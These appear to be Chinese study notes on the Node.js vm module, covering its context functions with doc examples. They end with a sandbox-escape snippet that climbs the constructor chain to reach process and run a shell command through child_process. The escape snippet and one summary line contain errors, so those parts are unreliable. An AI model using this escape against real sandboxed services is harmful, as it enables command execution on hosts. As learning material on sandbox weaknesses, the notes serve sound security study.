## vm 沙箱
### vm文档
https://nodejs.cn/api-v14/vm.htm
### vm沙箱常用函数
#### vm.runinThisContext(code)
`vm.runInThisContext()` 编译 `code`，在当前 `global` 的上下文中运行它并返回结果。 运行代码无权访问局部作用域，但可以访问当前 `global` 对象。

```js
const vm = require('vm');
let localVar = 'initial value';
  
const vmResult = vm.runInThisContext('localVar = "vm";');
console.log(`vmResult: '${vmResult}', localVar: '${localVar}'`);
// 打印: vmResult: 'vm', localVar: 'initial value'
  
const evalResult = eval('localVar = "eval";');
console.log(`evalResult: '${evalResult}', localVar: '${localVar}'`);
// 打印: evalResult: 'eval', localVar: 'eval'
```

#### vm.createContext([contextObject[, options]])
如果给定 `contextObject`，`vm.createContext()` 方法将准备那个对象，以便它可以用于调用 `vm.runInContext()` 或 `script.runInContext()`。 在此类脚本中，`contextObject` 将是全局对象，保留其所有现有属性，但也具有任何标准全局对象具有的内置对象和函数。 在 vm 模块运行的脚本之外，全局变量将保持不变。
```js
const vm = require('vm');

global.globalVar = 3;

const context = { globalVar: 1 };
vm.createContext(context);
vm.runInContext('globalVar *= 2;', context);

console.log(context);
// 打印: { globalVar: 2 }
console.log(global.globalVar);
// 打印: 3
```

从结果可以看出这个新的沙箱对象是独立于global外的一个独立作用域，而这个沙箱对象是这个作用域的全局对象，与global中的全局全局对象是不同的，相当于v8中的第二个global

#### vm.runInContext(code, contextifiedObject[, options])
`vm.runInContext()` 方法编译 code，在 `contextifiedObject` 的上下文中运行它，然后返回结果。 运行代码无权访问本地作用域。 `contextifiedObject` 对象必须之前已经使用 `vm.createContext(`) 方法上下文隔离化。
```js
const vm = require('vm');

const contextObject = { globalVar: 1 };
vm.createContext(contextObject);

for (let i = 0; i < 10; ++i) {
  vm.runInContext('globalVar *= 2;', contextObject);
}
console.log(contextObject);
// 打印: { globalVar: 1024 }
```
#### vm.runInNewContext(code[, contextObject[, options]])
`vm.runInNewContext()` 首先将给定的 `contextObject` 上下文化（如果作为 `undefined` 传入，则创建新的 `contextObject`），编译 code，在创建的上下文中运行它，然后返回结果。 运行代码无权访问本地作用域。
如果 `options` 是字符串，则指定文件名。
简单的说 `vm.runInNewContext = vm.createContext + vm.createContext`

### vm沙箱逃逸方法
#### 传递对象逃逸
```js
const vm = require("vm");

const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);
//const y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);
return y1.mainModule.require('child_process').execSync('whoami').toString()
console.log(y1);
```

这里的`this` 是传递给`runInNewContext`的对象，这个对象并不在沙箱环境中，接下来就和ssit相似的过程去获取构造器，以及构造器对象的构造器

>注意：数字，字符串，布尔这类都是primitive类型，在传递的过程中他们是将值传递过去而不是引用，所以是没有办法用来利用的



## 参考文章
